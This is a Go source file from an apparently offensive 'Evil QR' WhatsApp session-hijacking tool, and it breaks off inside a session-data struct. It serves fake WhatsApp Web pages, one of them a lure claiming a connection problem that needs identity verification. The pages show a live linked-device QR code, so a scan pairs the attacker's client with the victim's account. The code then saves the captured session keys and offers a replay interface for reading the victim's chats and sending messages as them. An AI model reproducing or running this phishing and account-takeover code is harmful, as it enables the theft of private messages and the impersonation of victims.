package whatsapp

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/proto/waE2E"
	"go.mau.fi/whatsmeow/store"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"go.mau.fi/whatsmeow/util/keys"
	waLog "go.mau.fi/whatsmeow/util/log"
	"google.golang.org/protobuf/proto"
	"rsc.io/qr"

	"programa/utils"
)

const (
	sessionsDir  = "scripts/qr_jacker/whatsapp/sessions"
	sessionsFile = "scripts/qr_jacker/whatsapp/sessions.json"
)

type sessionMeta struct {
	ID        string `json:"id"`
	Timestamp string `json:"timestamp"`
	Browser   string `json:"browser"`
	Profile   string `json:"profile"`
	URL       string `json:"url"`
}

type attackState struct {
	mu       sync.Mutex
	qrCode   string
	paired   bool
	errorMsg string
}

type serverState struct {
	mu          sync.Mutex
	running     bool
	url         string
	sessionCnt  int
	lastSession string
	stop        context.CancelFunc
}

var (
	attackSt attackState
	srvSt    serverState

	newSessionNote int32
)

func Run() {
	reader := bufio.NewReader(os.Stdin)
	for {
		utils.ClearTerminal()
		srvSt.mu.Lock()
		running := srvSt.running
		url := srvSt.url
		cnt := srvSt.sessionCnt
		last := srvSt.lastSession
		srvSt.mu.Unlock()

		if note := atomic.SwapInt32(&newSessionNote, 0); note != 0 {
			fmt.Printf("%s  ❗ NEW SESSION CAPTURED: %s%s\n\n", utils.Red, last, utils.Reset)
		}

		fmt.Printf("\n%s============ EVIL QR - WHATSAPP ============%s\n\n", utils.Blue, utils.Reset)
		if running {
			fmt.Printf("  %s⚡ QR Server: %s%s\n", utils.Green, url, utils.Reset)
			fmt.Printf("  %s   Sessions captured: %d%s\n\n", utils.Yellow, cnt, utils.Reset)
		}
		fmt.Printf("%s[1] - Start Attack%s\n", utils.Green, utils.Reset)
		if running {
			fmt.Printf("%s[2] - Stop Server%s\n", utils.Red, utils.Reset)
		}
		fmt.Printf("%s[3] - List Sessions%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[4] - Replay Session%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[5] - Clear Sessions%s\n", utils.Yellow, utils.Reset)
		fmt.Printf("%s[6] - Setup Reference Profile%s\n", utils.Blue, utils.Reset)
		utils.PrintReturnOption("7")

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			doAttack(reader)
		case "2":
			if running {
				stopServer()
			} else {
				fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
				utils.WaitForEnter(reader)
			}
		case "3":
			listSessions()
			utils.WaitForEnter(reader)
		case "4":
			doReplay(reader)
		case "5":
			clearSessions(reader)
		case "6":
			doSetupReference(reader)
		case "7":
			if running {
				stopServer()
			}
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			utils.WaitForEnter(reader)
		}
	}
}

func stopServer() {
	srvSt.mu.Lock()
	cancel := srvSt.stop
	srvSt.running = false
	srvSt.url = ""
	srvSt.mu.Unlock()
	if cancel != nil {
		cancel()
	}
	fmt.Printf("\n%s[+] Server stopped.%s\n", utils.Green, utils.Reset)
	utils.PauseForInput()
}

func clearSessions(reader *bufio.Reader) {
	fmt.Printf("\n%sClear all sessions? [y/N]: %s", utils.Red, utils.Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))
	if input == "y" || input == "yes" {
		os.RemoveAll(sessionsDir)
		os.Remove(sessionsFile)
		os.MkdirAll(sessionsDir, 0755)
		srvSt.mu.Lock()
		srvSt.sessionCnt = 0
		srvSt.lastSession = ""
		srvSt.mu.Unlock()
		fmt.Printf("%s[+] All sessions cleared.%s\n", utils.Green, utils.Reset)
	} else {
		fmt.Printf("%s[-] Cancelled.%s\n", utils.Yellow, utils.Reset)
	}
	utils.WaitForEnter(reader)
}

func doSetupReference(reader *bufio.Reader) {
	utils.ClearTerminal()
	fmt.Printf("\n%s============ SETUP REFERENCE PROFILE ============%s\n\n", utils.Blue, utils.Reset)
	fmt.Println("  This will open Chromium with web.whatsapp.com.")
	fmt.Println("  You need to scan the QR code with your phone.")
	fmt.Println("  After pairing, the IndexedDB schema will be saved.")
	fmt.Println("  This is required ONCE for browser replay to work.")
	fmt.Printf("\n%sProceed? [y/N]: %s", utils.Green, utils.Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))
	if input != "y" && input != "yes" {
		fmt.Printf("%s[-] Cancelled.%s\n", utils.Yellow, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	refDir := "scripts/qr_jacker/whatsapp/reference"
	if err := DiscoverReferenceProfile(refDir); err != nil {
		fmt.Printf("\n%s[!] Error: %v%s\n", utils.Red, err, utils.Reset)
	} else {
		fmt.Printf("\n%s[+] Reference profile saved to %s/%s\n", utils.Green, refDir, utils.Reset)
	}

	utils.WaitForEnter(reader)
}

func doAttack(reader *bufio.Reader) {
	if srvSt.running {
		fmt.Printf("\n%s[!] Server already running! Stop it first.%s\n", utils.Yellow, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	utils.ClearTerminal()
	fmt.Printf("\n%s============ CONFIGURE ATTACK ============%s\n", utils.Blue, utils.Reset)

	cfg := attackCfg{
		Port: 8080,
		Host: "0.0.0.0",
	}

	fmt.Printf("%sUse defaults (port 8080, host 0.0.0.0)? [Y/n]: %s", utils.Green, utils.Reset)
	useDef, _ := reader.ReadString('\n')
	useDef = strings.TrimSpace(strings.ToLower(useDef))
	if useDef == "n" || useDef == "no" {
		fmt.Printf("%sPort [8080]: %s", utils.Green, utils.Reset)
		p, _ := reader.ReadString('\n')
		p = strings.TrimSpace(p)
		if p != "" {
			fmt.Sscanf(p, "%d", &cfg.Port)
		}
		fmt.Printf("%sHost [0.0.0.0]: %s", utils.Green, utils.Reset)
		h, _ := reader.ReadString('\n')
		h = strings.TrimSpace(h)
		if h != "" {
			cfg.Host = h
		}
	}

	go launchAttack(cfg)
	fmt.Printf("\n%s[+] Attack launched in background! Returning to menu...%s\n", utils.Green, utils.Reset)
	time.Sleep(500 * time.Millisecond)
}

func launchAttack(cfg attackCfg) {
	os.MkdirAll(sessionsDir, 0755)

	ctx, cancel := context.WithCancel(context.Background())

	srvSt.mu.Lock()
	srvSt.stop = cancel
	srvSt.running = true
	srvSt.sessionCnt = 0
	srvSt.lastSession = ""
	ip := utils.GetLocalIP()
	srvSt.url = fmt.Sprintf("http://%s:%d", ip, cfg.Port)
	srvSt.mu.Unlock()

	mux := http.NewServeMux()
	mux.HandleFunc("/", verifyHandler)
	mux.HandleFunc("/qr", qrPageHandler)
	mux.HandleFunc("/qr-image", qrImageHandler)
	mux.HandleFunc("/qr-status", qrStatusHandler)

	addr := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		listener, err = net.Listen("tcp", ":0")
		if err != nil {
			srvSt.mu.Lock()
			srvSt.running = false
			srvSt.mu.Unlock()
			return
		}
	}
	actualAddr := listener.Addr().String()
	cfg.Host, cfg.Port = parseAddr(actualAddr)
	ip = utils.GetLocalIP()
	srvSt.mu.Lock()
	srvSt.url = fmt.Sprintf("http://%s:%d", ip, cfg.Port)
	srvSt.mu.Unlock()

	srv := &http.Server{Handler: mux}
	go srv.Serve(listener)

	for {
		select {
		case <-ctx.Done():
			srv.Close()
			srvSt.mu.Lock()
			srvSt.running = false
			srvSt.mu.Unlock()
			return
		default:
		}

		device := newDevice()
		cli := whatsmeow.NewClient(device, waLog.Noop)

		qrChan, err := cli.GetQRChannel(ctx)
		if err != nil {
			srv.Close()
			srvSt.mu.Lock()
			srvSt.running = false
			srvSt.mu.Unlock()
			return
		}

		err = cli.Connect()
		if err != nil {
			srv.Close()
			srvSt.mu.Lock()
			srvSt.running = false
			srvSt.mu.Unlock()
			return
		}

		attackSt.mu.Lock()
		attackSt.qrCode = ""
		attackSt.errorMsg = ""
		attackSt.paired = false
		attackSt.mu.Unlock()

		done := make(chan struct{})
		var closeOnce sync.Once
		go func() {
			for item := range qrChan {
				switch item.Event {
				case whatsmeow.QRChannelEventCode:
					attackSt.mu.Lock()
					attackSt.qrCode = item.Code
					attackSt.mu.Unlock()
				case whatsmeow.QRChannelSuccess.Event:
					attackSt.mu.Lock()
					attackSt.paired = true
					attackSt.mu.Unlock()
					saveCapturedSession(cli.Store)
					srvSt.mu.Lock()
					srvSt.sessionCnt++
					srvSt.lastSession = cli.Store.ID.String()
					srvSt.mu.Unlock()
					atomic.StoreInt32(&newSessionNote, 1)
					closeOnce.Do(func() { close(done) })
					return
				case whatsmeow.QRChannelEventError:
					attackSt.mu.Lock()
					if item.Error != nil {
						attackSt.errorMsg = item.Error.Error()
					}
					attackSt.mu.Unlock()
				case whatsmeow.QRChannelClientOutdated.Event:
					closeOnce.Do(func() { close(done) })
					return
				case whatsmeow.QRChannelTimeout.Event:
					attackSt.mu.Lock()
					attackSt.errorMsg = ""
					attackSt.qrCode = ""
					attackSt.mu.Unlock()
					closeOnce.Do(func() { close(done) })
					return
				case whatsmeow.QRChannelErrUnexpectedEvent.Event:
					attackSt.mu.Lock()
					attackSt.errorMsg = ""
					attackSt.qrCode = ""
					attackSt.mu.Unlock()
					closeOnce.Do(func() { close(done) })
					return
				}
			}
			closeOnce.Do(func() { close(done) })
		}()

		select {
		case <-done:
		case <-ctx.Done():
		}
		cli.Disconnect()
		if ctx.Err() != nil {
			break
		}
		time.Sleep(2 * time.Second)
	}

	srv.Close()
	srvSt.mu.Lock()
	srvSt.running = false
	srvSt.mu.Unlock()
}

func verifyHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write([]byte(verifyPageHTML))
}

func qrPageHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write([]byte(qrPageHTML))
}

func qrImageHandler(w http.ResponseWriter, r *http.Request) {
	attackSt.mu.Lock()
	code := attackSt.qrCode
	attackSt.mu.Unlock()

	if code == "" {
		w.WriteHeader(http.StatusServiceUnavailable)
		w.Write([]byte("QR not ready"))
		return
	}

	codeImg, err := qr.Encode(code, qr.Q)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write(codeImg.PNG())
}

func qrStatusHandler(w http.ResponseWriter, r *http.Request) {
	attackSt.mu.Lock()
	paired := attackSt.paired
	errMsg := attackSt.errorMsg
	hasQR := attackSt.qrCode != ""
	attackSt.mu.Unlock()

	status := "waiting"
	if paired {
		status = "paired"
	} else if errMsg != "" {
		status = "error"
	} else if !hasQR {
		status = "connecting"
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  status,
		"error":   errMsg,
		"paired":  paired,
	})
}

const verifyPageHTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#41525d}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.08);max-width:440px;width:90%;padding:48px 40px;text-align:center}
.icon{width:64px;height:64px;background:#fef3e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.icon svg{width:32px;height:32px}
h1{font-size:22px;font-weight:500;color:#1f2a30;margin-bottom:10px}
p{font-size:15px;line-height:1.6;color:#667781;margin-bottom:24px}
.btn{display:inline-block;background:#00a884;color:#fff;border:none;border-radius:24px;padding:12px 36px;font-size:15px;font-weight:500;cursor:pointer;text-decoration:none;transition:background .15s}
.btn:hover{background:#009972}
.btn:disabled{opacity:.5;cursor:default}
.spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="card">
<div class="icon"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e67e22" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="13" stroke="#e67e22" stroke-width="1.5" stroke-linecap="round"/><circle cx="12" cy="16" r="0.75" fill="#e67e22"/></svg></div>
<h1>Connection problem detected</h1>
<p>We detected a temporary connection issue with your WhatsApp session. For security reasons, you need to verify your identity before continuing to WhatsApp Web.</p>
<button class="btn" id="verifyBtn" onclick="this.disabled=true;this.innerHTML='<span class=spinner></span>Verifying...';setTimeout(function(){window.location.href='/qr'},1200)">Verify identity</button>
</div>
</body></html>`

const qrPageHTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;overflow:hidden;color:#41525d}
.top-bar{background:#00a884;height:6px;flex-shrink:0}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.06);display:flex;flex-direction:row;max-width:1000px;width:100%;min-height:520px;overflow:hidden}
.left{flex:1.1;padding:56px 48px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
.left .logo{margin-bottom:16px}
.left .logo svg{width:48px;height:48px}
.left h1{font-size:28px;font-weight:275;color:#41525d;margin-bottom:10px;letter-spacing:-0.3px}
.left .sub{font-size:15px;color:#667781;line-height:1.5;max-width:300px;margin-bottom:28px}
.left .steps-wrap{background:#f9fafb;border-radius:12px;padding:20px 24px;text-align:left;width:100%;max-width:320px}
.left .steps-wrap .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;font-size:14px;color:#3b4a54;line-height:1.5}
.left .steps-wrap .step:last-child{margin-bottom:0}
.left .steps-wrap .num{background:#00a884;color:#fff;border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0;margin-top:1px}
.left .steps-wrap .step strong{color:#1f2a30}
.right{flex:1;background:#fcfdfd;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 40px;border-left:1px solid #e9edef;position:relative}
.right .qr-label{font-size:13px;color:#8696a0;margin-bottom:14px;text-transform:uppercase;letter-spacing:1px}
.right .qr-border{border:3px solid #00a884;border-radius:16px;padding:12px;background:#fff;box-shadow:0 1px 6px rgba(0,168,132,0.12);margin-bottom:18px}
.right .qr-border img{display:block;width:240px;height:240px;border-radius:4px;image-rendering:pixelated}
.right .actions{display:flex;gap:10px;margin-top:4px;justify-content:center}
.right .actions a{display:inline-block;padding:8px 22px;border-radius:24px;font-size:13px;text-decoration:none;cursor:pointer;transition:all .15s}
.right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}
.right .actions .refresh:hover{background:#009972}
.footer{text-align:center;padding:18px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0;border-top:1px solid #e9edef}
.footer a{color:#00a884;text-decoration:none;margin:0 10px}
.footer a:hover{text-decoration:underline}
#pair-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.85);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
#pair-overlay.active{display:flex}
#pair-overlay .msg{background:#fff;border-radius:12px;padding:40px;max-width:420px;text-align:center;color:#41525d}
#pair-overlay .msg h2{font-size:22px;font-weight:500;margin-bottom:12px;color:#1f2a30}
#pair-overlay .msg p{font-size:15px;line-height:1.5;color:#667781;margin-bottom:20px}
#pair-overlay .msg .btn{display:inline-block;background:#00a884;color:#fff;border:none;border-radius:24px;padding:10px 32px;font-size:15px;cursor:pointer}
#pair-overlay .msg .btn:hover{background:#009972}
#status-msg{font-size:13px;color:#8696a0;margin-top:8px;min-height:20px}
@media(max-width:800px){.card{flex-direction:column-reverse;min-height:auto;border-radius:0}.left,.right{padding:28px 20px;border-left:none}.left .steps-wrap{max-width:100%}.right .qr-border img{width:200px;height:200px}}
@media(max-width:480px){.main{padding:0}.card{box-shadow:none}.left h1{font-size:22px}}
</style></head><body>
<div class="top-bar"></div>
<div class="main"><div class="card"><div class="left"><div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#00a884" d="M24 0C10.8 0 0 10.8 0 24c0 4.8 1.4 9.2 3.8 13L1.2 46.8 12 43.2c3.6 2 7.8 3.2 12 3.2 13.2 0 24-10.8 24-24S37.2 0 24 0z"/><path fill="#fff" d="M33.6 28.8c-.6-.3-3.6-1.8-4.2-2-.6-.2-1-.3-1.4.3-.4.6-1.6 2-2 2.4-.4.4-.8.4-1.4.1-.6-.3-2.4-.9-4.6-2.8-1.7-1.5-2.8-3.3-3.2-3.9-.3-.6 0-.9.3-1.2.3-.3.6-.6.8-.9.3-.3.4-.6.6-.9.2-.3.1-.6-.1-.9-.2-.3-1.4-3.4-1.9-4.6-.5-1.2-1-1-1.4-1-.4 0-.8-.1-1.2-.1-.4 0-1.1.2-1.7.8-.6.6-2.2 2.2-2.2 5.3s2.2 6.2 2.6 6.6c.3.4 4.4 7 10.8 9.6 1.5.6 2.7 1 3.6 1.3 1.5.5 2.9.4 4 .3 1.2-.1 3.8-1.5 4.3-3 .5-1.4.5-2.6.4-2.9-.2-.3-.6-.5-1.1-.8z"/></svg></div><h1>Use WhatsApp on your computer</h1><p class="sub">To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps-wrap"><div class="step"><span class="num">1</span><span>Open <strong>WhatsApp</strong> on your phone</span></div><div class="step"><span class="num">2</span><span>Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></span></div><div class="step"><span class="num">3</span><span>Point your phone at this screen to scan the QR code</span></div></div></div><div class="right"><div class="qr-label">Scan QR Code</div><div class="qr-border"><img id="qr-img" src="/qr-image" alt="QR Code" width="240" height="240"></div><div class="actions"><a class="refresh" href="#" onclick="document.getElementById('qr-img').src='/qr-image?'+Date.now()">Refresh QR</a></div><div id="status-msg">Connecting to WhatsApp...</div></div></div></div>
<div class="footer"><a href="#">Get WhatsApp for Windows</a><a href="#">Tutorial</a><a href="#">Privacy Policy</a></div>
<div id="pair-overlay"><div class="msg"><h2>Verification required</h2><p>For security reasons, please confirm your identity to continue using WhatsApp Web. Click the button below to verify.</p><button class="btn" onclick="document.getElementById('pair-overlay').classList.remove('active')">Verify</button></div></div>
<script>
(function(){
var img = document.getElementById('qr-img');
var overlay = document.getElementById('pair-overlay');
var statusMsg = document.getElementById('status-msg');

function refreshQR(){
img.src = '/qr-image?' + Date.now();
}

function pollStatus(){
fetch('/qr-status').then(function(r){return r.json()}).then(function(data){
if(data.status === 'paired'){
overlay.classList.add('active');
statusMsg.textContent = 'Paired successfully!';
} else if(data.status === 'error'){
statusMsg.textContent = 'Error: ' + (data.error || 'unknown');
} else if(data.status === 'connecting'){
statusMsg.textContent = 'Connecting to WhatsApp...';
} else {
statusMsg.textContent = 'Scan the QR code with your phone';
}
}).catch(function(){
statusMsg.textContent = 'Checking status...';
});
}

setInterval(refreshQR, 15000);
setInterval(pollStatus, 2000);
pollStatus();
})();
</script>
</body></html>`

const replayHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;background:#efefef}
#app{display:flex;width:100%;height:100vh;overflow:hidden}
.sidebar{width:410px;min-width:340px;background:#fff;border-right:1px solid #e9edef;display:flex;flex-direction:column;flex-shrink:0}
.main{flex:1;display:flex;flex-direction:column;background:#efeae2;position:relative}
.main-bg{position:absolute;inset:0;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 288 288"><circle cx="144" cy="144" r="140" fill="none" stroke="%23e0ddd6" stroke-width="2"/><circle cx="80" cy="80" r="4" fill="%23e0ddd6"/><circle cx="208" cy="80" r="4" fill="%23e0ddd6"/><circle cx="144" cy="180" r="40" fill="none" stroke="%23e0ddd6" stroke-width="2"/></svg>');background-size:288px;opacity:0.06;pointer-events:none}
.header{background:#f0f2f5;padding:10px 16px;display:flex;align-items:center;min-height:59px;border-bottom:1px solid #e9edef;z-index:1}
.header-avatar{width:40px;height:40px;border-radius:50%;background:#dfe5e7;display:flex;align-items:center;justify-content:center;font-size:18px;color:#54656f;margin-right:15px;flex-shrink:0;overflow:hidden}
.header-info{flex:1;min-width:0}
.header-name{font-size:16px;font-weight:500;color:#111b21}
.header-status{font-size:13px;color:#667781}
.search-box{padding:8px 12px;background:#f0f2f5;border-bottom:1px solid #e9edef}
.search-input{width:100%;padding:8px 12px;border:none;border-radius:8px;background:#fff;font-size:14px;outline:none}
.chat-list{flex:1;overflow-y:auto}
.chat-item{display:flex;padding:12px 16px;cursor:pointer;border-bottom:1px solid #f0f2f5;transition:background .1s}
.chat-item:hover,.chat-item.active{background:#f0f2f5}
.chat-avatar{width:49px;height:49px;border-radius:50%;background:#dfe5e7;display:flex;align-items:center;justify-content:center;font-size:20px;color:#54656f;margin-right:15px;flex-shrink:0;overflow:hidden;font-weight:500}
.chat-info{flex:1;min-width:0}
.chat-name{font-size:16px;font-weight:400;color:#111b21;display:flex;align-items:center}
.chat-name span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.chat-time{font-size:12px;color:#667781;margin-left:6px;white-space:nowrap}
.chat-preview{font-size:14px;color:#667781;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-top:2px}
.chat-unread{background:#25d366;color:#fff;border-radius:16px;padding:0 6px;font-size:11px;min-width:20px;height:20px;display:flex;align-items:center;justify-content:center;margin-left:8px;font-weight:600}
.messages-area{flex:1;overflow-y:auto;padding:20px 60px;z-index:1}
.msg-row{display:flex;margin-bottom:2px}
.msg-row.outgoing{justify-content:flex-end}
.msg-bubble{max-width:65%;padding:6px 8px 8px 9px;border-radius:8px;font-size:14.2px;line-height:1.4;word-wrap:break-word;position:relative;box-shadow:0 1px 1px rgba(0,0,0,0.06)}
.msg-row.incoming .msg-bubble{background:#fff;border-top-left-radius:0}
.msg-row.outgoing .msg-bubble{background:#d9fdd3;border-top-right-radius:0}
.msg-time{font-size:11px;color:#667781;float:right;margin:4px 0 -4px 8px}
.msg-bubble em{font-style:normal;color:#667781}
.empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#8696a0;z-index:1}
.empty-icon{width:96px;height:96px;border-radius:50%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;font-size:40px;margin-bottom:24px}
.empty-state h3{font-size:20px;font-weight:300;color:#41525d;margin-bottom:10px}
.empty-state p{font-size:14px;text-align:center;line-height:1.5;max-width:400px}
.input-area{padding:8px 16px;background:#f0f2f5;display:flex;align-items:center;gap:8px;z-index:1}
.input-area input{flex:1;padding:10px 16px;border:none;border-radius:8px;font-size:15px;outline:none;background:#fff}
.input-area button{width:40px;height:40px;border-radius:50%;border:none;background:transparent;color:#54656f;cursor:pointer;font-size:20px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.input-area button:hover{background:#e9edef}
.input-area button.send{color:#fff;background:#00a884}
.input-area button.send:hover{background:#009972}
.no-chat{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#8696a0;z-index:1}
.no-chat .lock-icon{width:80px;height:80px;border-radius:50%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;font-size:32px;margin-bottom:20px}
.no-chat h3{font-size:20px;font-weight:300;color:#41525d;margin-bottom:8px}
.no-chat p{font-size:14px;max-width:400px;text-align:center;line-height:1.5}
.back-btn{display:none;background:none;border:none;font-size:24px;cursor:pointer;color:#54656f;margin-right:8px;padding:4px}
@media(max-width:720px){.sidebar{width:100%}.main{display:none}.main.show{display:flex}.sidebar.hide{display:none}.messages-area{padding:20px 16px}.back-btn{display:block}}
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
</style>
</head>
<body>
<div id="app">
<div class="sidebar" id="sidebar">
<div class="header">
<div class="header-avatar" id="selfAvatar">👤</div>
<div class="header-info">
<div class="header-name">WhatsApp Web</div>
<div class="header-status" id="status">Connecting...</div>
</div>
</div>
<div class="search-box"><input class="search-input" placeholder="Search or start new chat" oninput="filterChats()"></div>
<div class="chat-list" id="chatList"></div>
</div>
<div class="main" id="main">
<div class="main-bg"></div>
<div class="header" id="chatHeader" style="display:none">
<button class="back-btn" onclick="showSidebar()">←</button>
<div class="header-avatar" id="chatAvatar">👤</div>
<div class="header-info">
<div class="header-name" id="chatName"></div>
<div class="header-status" id="chatStatus"></div>
</div>
</div>
<div class="messages-area" id="messagesArea"></div>
<div class="no-chat" id="noChat">
<div class="lock-icon">🔒</div>
<h3>WhatsApp Web</h3>
<p>Select a chat to start messaging, or wait for new messages to arrive.</p>
</div>
<div class="input-area" id="inputArea" style="display:none">
<input id="msgInput" placeholder="Type a message" onkeydown="if(event.key==='Enter')sendMsg()">
<button onclick="sendMsg()" class="send">➤</button>
</div>
</div>
</div>
<script>
var sel=null,allChats=[],allMsgs={};
function $(i){return document.getElementById(i)}
function status(s){$('status').textContent=s}
function filterChats(){var q=document.querySelector('.search-input').value.toLowerCase();document.querySelectorAll('.chat-item').forEach(function(e){e.style.display=e.dataset.name.toLowerCase().includes(q)?'':'none'})}
function renderChats(chats){allChats=chats;$('chatList').innerHTML=chats.map(function(c){var a=c.jid===sel?'active':'',u=c.unread>0?'<span class="chat-unread">'+c.unread+'</span>':'',t=c.last_time?new Date(c.last_time*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'';return'<div class="chat-item '+a+'" data-jid="'+c.jid+'" data-name="'+(c.name||c.jid)+'" onclick="selectChat(\''+c.jid+'\')"><div class="chat-avatar">'+(c.name||c.jid)[0].toUpperCase()+'</div><div class="chat-info"><div class="chat-name"><span>'+(c.name||c.jid)+'</span><span class="chat-time">'+t+'</span></div><div class="chat-preview">'+(c.last_message||'')+'</div></div>'+u+'</div>'}).join('')}
function renderMsgs(jid){var a=$('messagesArea'),msgs=allMsgs[jid]||[];if(!msgs.length){a.innerHTML='<div class="empty-state" style="flex:1"><div class="empty-icon">💬</div><h3>No messages yet</h3><p>Messages will appear here in real-time</p></div>';return}a.innerHTML=msgs.map(function(m){var c=m.from_me?'outgoing':'incoming',t=new Date(m.time*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}),x=m.media_type?'<em>'+m.content+'</em>':m.content;return'<div class="msg-row '+c+'"><div class="msg-bubble">'+x+'<span class="msg-time">'+t+'</span></div></div>'}).join('');a.scrollTop=a.scrollHeight}
function selectChat(jid){sel=jid;$('noChat').style.display='none';$('chatHeader').style.display='';$('inputArea').style.display='';$('messagesArea').style.display='';var c=allChats.find(function(x){return x.jid===jid});$('chatName').textContent=c?c.name||c.jid:jid;$('chatStatus').textContent=c?'Click here for contact info':'';renderChats(allChats);fetchMsgs(jid);if(window.innerWidth<=720){$('sidebar').classList.add('hide');$('main').classList.add('show')}}
function showSidebar(){$('sidebar').classList.remove('hide');$('main').classList.remove('show')}
function sendMsg(){var inp=$('msgInput'),t=inp.value.trim();if(!t||!sel)return;inp.value='';fetch('/api/send?jid='+encodeURIComponent(sel)+'&text='+encodeURIComponent(t),{method:'POST'}).catch(function(){})}
function fetchChats(){fetch('/api/chats').then(function(r){return r.json()}).then(function(chats){allChats=chats;renderChats(chats);if(sel&&!chats.find(function(c){return c.jid===sel}))sel=null;if(chats.length)status('Online')}).catch(function(){status('Checking...')})}
function fetchMsgs(jid){fetch('/api/messages?jid='+encodeURIComponent(jid)).then(function(r){return r.json()}).then(function(msgs){allMsgs[jid]=msgs;if(jid===sel)renderMsgs(jid)}).catch(function(){})}
setInterval(fetchChats,3000);setInterval(function(){if(sel)fetchMsgs(sel)},3000);fetchChats();
</script>
</body></html>`

type sessionData struct {
	Timestamp      string `json:"timestamp"`
	NoisePub       []byte `json:"noise_pub"`
	NoisePriv      []byte `json:"noise_priv"`
	IdentityPub    []byte `json:"identity_pub"`
	IdentityPriv   []byte `json:"identity_priv"`
	SignedPreKeyID uint32 `json:"signed_pre_key_id"`
	SignedPrePub   []byte `json:"signed_pre_pub"`
	SignedPrePriv  []byte `json:"signed_pre_priv"`
	SignedPreSig   []byte `json:"signed_pre_sig"`
	RegistrationID uint32 `json:"registration_id"`
	AdvSecretKey   []byte `json:"adv_secret_key"`
